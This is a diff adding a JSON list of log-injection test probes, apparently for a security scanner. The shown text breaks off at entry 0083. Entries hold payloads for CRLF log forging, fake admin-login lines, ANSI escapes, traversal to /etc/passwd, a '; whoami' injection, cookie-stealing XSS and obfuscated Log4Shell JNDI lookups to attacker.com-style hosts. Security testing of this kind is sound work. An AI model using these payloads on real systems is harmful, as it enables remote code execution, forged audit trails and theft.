@@ -1,0 +1,1172 @@
+[
+  {
+    "id": "log-injection-owasp-0001",
+    "name": "CRLF injection in logs",
+    "template": "\\r\\n",
+    "description": "CRLF injection in logs probe from OWASP. Tests application handling of: \\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0002",
+    "name": "CRLF injection in logs #2",
+    "template": "\\r\\nUser: admin logged in successfully",
+    "description": "CRLF injection in logs probe from OWASP. Tests application handling of: \\r\\nUser: admin logged in succ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0003",
+    "name": "CRLF injection in logs #3",
+    "template": "%0d%0a",
+    "description": "CRLF injection in logs probe from OWASP. Tests application handling of: %0d%0a",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0004",
+    "name": "CRLF injection in logs #4",
+    "template": "%0d%0aAuthentication successful for admin",
+    "description": "CRLF injection in logs probe from OWASP. Tests application handling of: %0d%0aAuthentication successfu...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0005",
+    "name": "Log poisoning",
+    "template": "\\nuser=admin authenticated=true\\n",
+    "description": "Log poisoning probe from OWASP. Tests application handling of: \\nuser=admin authenticated=tru...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0006",
+    "name": "Log poisoning #2",
+    "template": "\\r\\nSUCCESS: Admin login\\r\\n",
+    "description": "Log poisoning probe from OWASP. Tests application handling of: \\r\\nSUCCESS: Admin login\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0007",
+    "name": "Log poisoning #3",
+    "template": "%0auser:admin%0astatus:success%0a",
+    "description": "Log poisoning probe from OWASP. Tests application handling of: %0auser:admin%0astatus:success...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0008",
+    "name": "Log format manipulation",
+    "template": "admin\\nAuthenticated:true",
+    "description": "Log format manipulation probe from OWASP. Tests application handling of: admin\\nAuthenticated:true",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0009",
+    "name": "Log format manipulation #2",
+    "template": "test\\r\\nRole:administrator",
+    "description": "Log format manipulation probe from OWASP. Tests application handling of: test\\r\\nRole:administrator",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0010",
+    "name": "Time-based log injection",
+    "template": "[2023-01-01 00:00:00] User admin logged in successfully",
+    "description": "Time-based log injection probe from OWASP. Tests application handling of: [2023-01-01 00:00:00] User adm...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0011",
+    "name": "Time-based log injection #2",
+    "template": "[CRITICAL] Unauthorized access detected",
+    "description": "Time-based log injection probe from OWASP. Tests application handling of: [CRITICAL] Unauthorized access...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0012",
+    "name": "Null byte injection in logs",
+    "template": "admin\\x00",
+    "description": "Null byte injection in logs probe from OWASP. Tests application handling of: admin\\x00",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0013",
+    "name": "Null byte injection in logs #2",
+    "template": "user\\x00admin",
+    "description": "Null byte injection in logs probe from OWASP. Tests application handling of: user\\x00admin",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0014",
+    "name": "ANSI escape sequences (log injection)",
+    "template": "\\x1b[31mCRITICAL\\x1b[0m",
+    "description": "ANSI escape sequences (log injection) probe from OWASP. Tests application handling of: \\x1b[31mCRITICAL\\x1b[0m",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0015",
+    "name": "ANSI escape sequences (log injection) #2",
+    "template": "\\033[1;31mALERT\\033[0m",
+    "description": "ANSI escape sequences (log injection) probe from OWASP. Tests application handling of: \\033[1;31mALERT\\033[0m",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0016",
+    "name": "Log file path traversal",
+    "template": "../../logs/application.log",
+    "description": "Log file path traversal probe from OWASP. Tests application handling of: ../../logs/application.log",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0017",
+    "name": "Log file path traversal #2",
+    "template": "/var/log/auth.log",
+    "description": "Log file path traversal probe from OWASP. Tests application handling of: /var/log/auth.log",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0018",
+    "name": "Log file path traversal #3",
+    "template": "../../../var/log/syslog",
+    "description": "Log file path traversal probe from OWASP. Tests application handling of: ../../../var/log/syslog",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0019",
+    "name": "Sample payloads to check logging behavior",
+    "template": "SELECT * FROM users WHERE username='admin' AND password='wrong'",
+    "description": "Sample payloads to check logging behavior probe from OWASP. Tests application handling of: SELECT * FROM users WHERE user...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0020",
+    "name": "Sample payloads to check logging behavior #2",
+    "template": "<script>alert('XSS')</script>",
+    "description": "Sample payloads to check logging behavior probe from OWASP. Tests application handling of: <script>alert('XSS')</script>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0021",
+    "name": "Sample payloads to check logging behavior #3",
+    "template": "../../../etc/passwd",
+    "description": "Sample payloads to check logging behavior probe from OWASP. Tests application handling of: ../../../etc/passwd",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0022",
+    "name": "Sample payloads to check logging behavior #4",
+    "template": "; whoami",
+    "description": "Sample payloads to check logging behavior probe from OWASP. Tests application handling of: ; whoami",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0023",
+    "name": "Many servers log User-Agent, Referer, and X-Forwarded-For...",
+    "template": "User-Agent: admin\\n[INFO] authenticated=true",
+    "description": "Many servers log User-Agent, Referer, and X-Forwarded-For verbatim probe from OWASP. Tests application handling of: User-Agent: admin\\n[INFO] auth...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0024",
+    "name": "Many servers log User-Agent, Referer, and X-Forwarded-For verbatim #2",
+    "template": "X-Forwarded-For: 127.0.0.1\\r\\n[INFO] user=admin login OK",
+    "description": "Many servers log User-Agent, Referer, and X-Forwarded-For verbatim probe from OWASP. Tests application handling of: X-Forwarded-For: 127.0.0.1\\r\\n...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0025",
+    "name": "Many servers log User-Agent, Referer, and X-Forwarded-For verbatim #3",
+    "template": "Referer: \\r\\n[ERROR] password reset granted for admin",
+    "description": "Many servers log User-Agent, Referer, and X-Forwarded-For verbatim probe from OWASP. Tests application handling of: Referer: \\r\\n[ERROR] password ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0026",
+    "name": "Many servers log User-Agent, Referer, and X-Forwarded-For verbatim #4",
+    "template": "User-Agent: %0d%0a[ADMIN] session elevated to root",
+    "description": "Many servers log User-Agent, Referer, and X-Forwarded-For verbatim probe from OWASP. Tests application handling of: User-Agent: %0d%0a[ADMIN] sess...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0027",
+    "name": "Log entry spoofing (fake severity / level)",
+    "template": "[INFO] user=attacker action=login result=success",
+    "description": "Log entry spoofing (fake severity / level) probe from OWASP. Tests application handling of: [INFO] user=attacker action=lo...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0028",
+    "name": "Log entry spoofing (fake severity / level) #2",
+    "template": "[WARN] failed login for attacker",
+    "description": "Log entry spoofing (fake severity / level) probe from OWASP. Tests application handling of: [WARN] failed login for attack...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0029",
+    "name": "Log entry spoofing (fake severity / level) #3",
+    "template": "[ERROR] attacker triggered alert",
+    "description": "Log entry spoofing (fake severity / level) probe from OWASP. Tests application handling of: [ERROR] attacker triggered ale...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0030",
+    "name": "Log entry spoofing (fake severity / level) #4",
+    "template": "[FATAL] system compromise by attacker",
+    "description": "Log entry spoofing (fake severity / level) probe from OWASP. Tests application handling of: [FATAL] system compromise by a...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0031",
+    "name": "Timestamp spoofing",
+    "template": "[2024-01-01 12:00:00] user=admin login ok",
+    "description": "Timestamp spoofing probe from OWASP. Tests application handling of: [2024-01-01 12:00:00] user=adm...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0032",
+    "name": "Timestamp spoofing #2",
+    "template": "[1970-01-01 00:00:00] cron job executed",
+    "description": "Timestamp spoofing probe from OWASP. Tests application handling of: [1970-01-01 00:00:00] cron job...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0033",
+    "name": "Timestamp spoofing #3",
+    "template": "[%Y-%m-%d %H:%M:%S] injected timestamp",
+    "description": "Timestamp spoofing probe from OWASP. Tests application handling of: [%Y-%m-%d %H:%M:%S] injected t...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0034",
+    "name": "Unicode / homoglyph spoofing to evade keyword filters",
+    "template": "\u0430dmin",
+    "description": "Unicode / homoglyph spoofing to evade keyword filters probe from OWASP. Tests application handling of: \u0430dmin",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0035",
+    "name": "Unicode / homoglyph spoofing to evade keyword filters #2",
+    "template": "\u0430dmin\\n[INFO] authenticated=true",
+    "description": "Unicode / homoglyph spoofing to evade keyword filters probe from OWASP. Tests application handling of: \u0430dmin\\n[INFO] authenticated=tr...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0036",
+    "name": "Unicode / homoglyph spoofing to evade keyword filters #3",
+    "template": "user=adm\u2170n",
+    "description": "Unicode / homoglyph spoofing to evade keyword filters probe from OWASP. Tests application handling of: user=adm\u2170n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0037",
+    "name": "Unicode / homoglyph spoofing to evade keyword filters #4",
+    "template": "user=\u0430dmin (Cyrillic '\u0430')",
+    "description": "Unicode / homoglyph spoofing to evade keyword filters probe from OWASP. Tests application handling of: user=\u0430dmin (Cyrillic '\u0430')",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0038",
+    "name": "Log viewer XSS (when logs are rendered in a web UI)",
+    "template": "</script><script>alert(1)</script>",
+    "description": "Log viewer XSS (when logs are rendered in a web UI) probe from OWASP. Tests application handling of: </script><script>alert(1)</scr...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0039",
+    "name": "Log viewer XSS (when logs are rendered in a web UI) #2",
+    "template": "<img src=x onerror=alert(document.cookie)>",
+    "description": "Log viewer XSS (when logs are rendered in a web UI) probe from OWASP. Tests application handling of: <img src=x onerror=alert(docum...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0040",
+    "name": "Log viewer XSS (when logs are rendered in a web UI) #3",
+    "template": "<svg/onload=alert(1)>",
+    "description": "Log viewer XSS (when logs are rendered in a web UI) probe from OWASP. Tests application handling of: <svg/onload=alert(1)>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0041",
+    "name": "Log viewer XSS (when logs are rendered in a web UI) #4",
+    "template": "<%= ${alert(1)} %>",
+    "description": "Log viewer XSS (when logs are rendered in a web UI) probe from OWASP. Tests application handling of: <%= ${alert(1)} %>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0042",
+    "name": "Log viewer XSS (when logs are rendered in a web UI) #5",
+    "template": "{{constructor.constructor('alert(1)')()}}",
+    "description": "Log viewer XSS (when logs are rendered in a web UI) probe from OWASP. Tests application handling of: {{constructor.constructor('ale...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0043",
+    "name": "Log splitting / forging with multiple delimiters",
+    "template": "admin%0a%0d[INFO] new admin account created",
+    "description": "Log splitting / forging with multiple delimiters probe from OWASP. Tests application handling of: admin%0a%0d[INFO] new admin ac...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0044",
+    "name": "Log splitting / forging with multiple delimiters #2",
+    "template": "user=test%0A[OK] privilege escalated",
+    "description": "Log splitting / forging with multiple delimiters probe from OWASP. Tests application handling of: user=test%0A[OK] privilege esc...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0045",
+    "name": "Log splitting / forging with multiple delimiters #3",
+    "template": "\\r\\n\\r\\n[SYSTEM] backup completed",
+    "description": "Log splitting / forging with multiple delimiters probe from OWASP. Tests application handling of: \\r\\n\\r\\n[SYSTEM] backup comple...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0046",
+    "name": "ANSI / terminal control escape sequences",
+    "template": "\\x1b[2J\\x1b[H",
+    "description": "ANSI / terminal control escape sequences probe from OWASP. Tests application handling of: \\x1b[2J\\x1b[H",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0047",
+    "name": "ANSI / terminal control escape sequences #2",
+    "template": "\\x1b[?25l",
+    "description": "ANSI / terminal control escape sequences probe from OWASP. Tests application handling of: \\x1b[?25l",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0048",
+    "name": "ANSI / terminal control escape sequences #3",
+    "template": "\\x1b]0;injected\\x07",
+    "description": "ANSI / terminal control escape sequences probe from OWASP. Tests application handling of: \\x1b]0;injected\\x07",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0049",
+    "name": "ANSI / terminal control escape sequences #4",
+    "template": "\\x1b[31;1mFAKE ALERT\\x1b[0m",
+    "description": "ANSI / terminal control escape sequences probe from OWASP. Tests application handling of: \\x1b[31;1mFAKE ALERT\\x1b[0m",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0050",
+    "name": "Carriage return only (old Mac / some parsers)",
+    "template": "\\rAdmin login succeeded\\r",
+    "description": "Carriage return only (old Mac / some parsers) probe from OWASP. Tests application handling of: \\rAdmin login succeeded\\r",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0051",
+    "name": "Carriage return only (old Mac / some parsers) #2",
+    "template": "\\r[INFO] user=root authenticated",
+    "description": "Carriage return only (old Mac / some parsers) probe from OWASP. Tests application handling of: \\r[INFO] user=root authenticat...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0052",
+    "name": "Tab / whitespace pollution to break column parsers",
+    "template": "admin\\trole=admin",
+    "description": "Tab / whitespace pollution to break column parsers probe from OWASP. Tests application handling of: admin\\trole=admin",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0053",
+    "name": "Tab / whitespace pollution to break column parsers #2",
+    "template": "user=guest\\tstatus=OK\\tbypass=true",
+    "description": "Tab / whitespace pollution to break column parsers probe from OWASP. Tests application handling of: user=guest\\tstatus=OK\\tbypass=...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0054",
+    "name": "Tab / whitespace pollution to break column parsers #3",
+    "template": "\\t\\t[INFO] injected row",
+    "description": "Tab / whitespace pollution to break column parsers probe from OWASP. Tests application handling of: \\t\\t[INFO] injected row",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0055",
+    "name": "JSON log injection (when logs are structured JSON)",
+    "template": "{\"user\":\"admin\",\"auth\":\"true\"}",
+    "description": "JSON log injection (when logs are structured JSON) probe from OWASP. Tests application handling of: {\"user\":\"admin\",\"auth\":\"true\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0056",
+    "name": "JSON log injection (when logs are structured JSON) #2",
+    "template": "\",\"auth\":\"true\"}",
+    "description": "JSON log injection (when logs are structured JSON) probe from OWASP. Tests application handling of: \",\"auth\":\"true\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0057",
+    "name": "JSON log injection (when logs are structured JSON) #3",
+    "template": "\",\"level\":\"ERROR\",\"msg\":\"injected\"}",
+    "description": "JSON log injection (when logs are structured JSON) probe from OWASP. Tests application handling of: \",\"level\":\"ERROR\",\"msg\":\"injec...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0058",
+    "name": "JSON log injection (when logs are structured JSON) #4",
+    "template": "{\\\"user\\\":\\\"admin\\\"}\\n{\"user\":\"attacker\",\"auth\":\"false\"}",
+    "description": "JSON log injection (when logs are structured JSON) probe from OWASP. Tests application handling of: {\\\"user\\\":\\\"admin\\\"}\\n{\"user\":...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0059",
+    "name": "Multi-line / continuation injection for SIEM confusion",
+    "template": "event=login",
+    "description": "Multi-line / continuation injection for SIEM confusion probe from OWASP. Tests application handling of: event=login",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0060",
+    "name": "Multi-line / continuation injection for SIEM confusion #2",
+    "template": "forged=second_event_hidden",
+    "description": "Multi-line / continuation injection for SIEM confusion probe from OWASP. Tests application handling of: forged=second_event_hidden",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0061",
+    "name": "Multi-line / continuation injection for SIEM confusion #3",
+    "template": "user=attacker",
+    "description": "Multi-line / continuation injection for SIEM confusion probe from OWASP. Tests application handling of: user=attacker",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0062",
+    "name": "Multi-line / continuation injection for SIEM confusion #4",
+    "template": "\\tignored_by_parser",
+    "description": "Multi-line / continuation injection for SIEM confusion probe from OWASP. Tests application handling of: \\tignored_by_parser",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0063",
+    "name": "Audit-trail circumvention (hide activity between noise)",
+    "template": "noise_event_1",
+    "description": "Audit-trail circumvention (hide activity between noise) probe from OWASP. Tests application handling of: noise_event_1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0064",
+    "name": "Audit-trail circumvention (hide activity between noise) #2",
+    "template": "user=admin\\raction=delete_all",
+    "description": "Audit-trail circumvention (hide activity between noise) probe from OWASP. Tests application handling of: user=admin\\raction=delete_all",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0065",
+    "name": "Audit-trail circumvention (hide activity between noise) #3",
+    "template": "noise_event_2",
+    "description": "Audit-trail circumvention (hide activity between noise) probe from OWASP. Tests application handling of: noise_event_2",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0066",
+    "name": "Control character stripping bypass",
+    "template": "admin\\u200b\\u200b (zero-width spaces)",
+    "description": "Control character stripping bypass probe from OWASP. Tests application handling of: admin\\u200b\\u200b (zero-width ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0067",
+    "name": "Control character stripping bypass #2",
+    "template": "user=adm\\u200cin (zero-width joiner)",
+    "description": "Control character stripping bypass probe from OWASP. Tests application handling of: user=adm\\u200cin (zero-width j...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0068",
+    "name": "Control character stripping bypass #3",
+    "template": "user=adm\\uFEFFin (BOM / zero-width no-break space)",
+    "description": "Control character stripping bypass probe from OWASP. Tests application handling of: user=adm\\uFEFFin (BOM / zero-w...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0069",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228)",
+    "template": "${jndi:ldap://attacker.com/a}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${jndi:ldap://attacker.com/a}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0070",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #2",
+    "template": "${jndi:ldap://127.0.0.1:1389/exploit}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${jndi:ldap://127.0.0.1:1389/e...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0071",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #3",
+    "template": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil/x}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${${::-j}${::-n}${::-d}${::-i}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0072",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #4",
+    "template": "${jndi:rmi://attacker.example/a}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${jndi:rmi://attacker.example/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0073",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #5",
+    "template": "${jndi:dns://attacker.com}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${jndi:dns://attacker.com}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0074",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #6",
+    "template": "${jndi:ldaps://attacker.com/leak}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${jndi:ldaps://attacker.com/le...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0075",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #7",
+    "template": "$X{java:version}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: $X{java:version}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0076",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #8",
+    "template": "${env:USER}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${env:USER}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0077",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #9",
+    "template": "${sys:os.name}",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${sys:os.name}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0078",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #10",
+    "template": "${lower:J}NDI",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${lower:J}NDI",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0079",
+    "name": "Log4j / Log4Shell-style injection (CVE-2021-44228) #11",
+    "template": "${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://x",
+    "description": "Log4j / Log4Shell-style injection (CVE-2021-44228) probe from OWASP. Tests application handling of: ${::-j}${::-n}${::-d}${::-i}:$...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0080",
+    "name": "Syslog / PRI header injection (RFC 3164 / RFC 5424)",
+    "template": "<34>Oct 13 09:00:00 host app[123]: injected message",
+    "description": "Syslog / PRI header injection (RFC 3164 / RFC 5424) probe from OWASP. Tests application handling of: <34>Oct 13 09:00:00 host app[1...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0081",
+    "name": "Syslog / PRI header injection (RFC 3164 / RFC 5424) #2",
+    "template": "<165>1 2024-01-01T00:00:00Z host proc 123 - injected=1",
+    "description": "Syslog / PRI header injection (RFC 3164 / RFC 5424) probe from OWASP. Tests application handling of: <165>1 2024-01-01T00:00:00Z ho...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0082",
+    "name": "Syslog / PRI header injection (RFC 3164 / RFC 5424) #3",
+    "template": "<0>kernel: [fake] privilege escalation detected",
+    "description": "Syslog / PRI header injection (RFC 3164 / RFC 5424) probe from OWASP. Tests application handling of: <0>kernel: [fake] privilege es...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "log-injection-payloads.txt"
+  },
+  {
+    "id": "log-injection-owasp-0083",
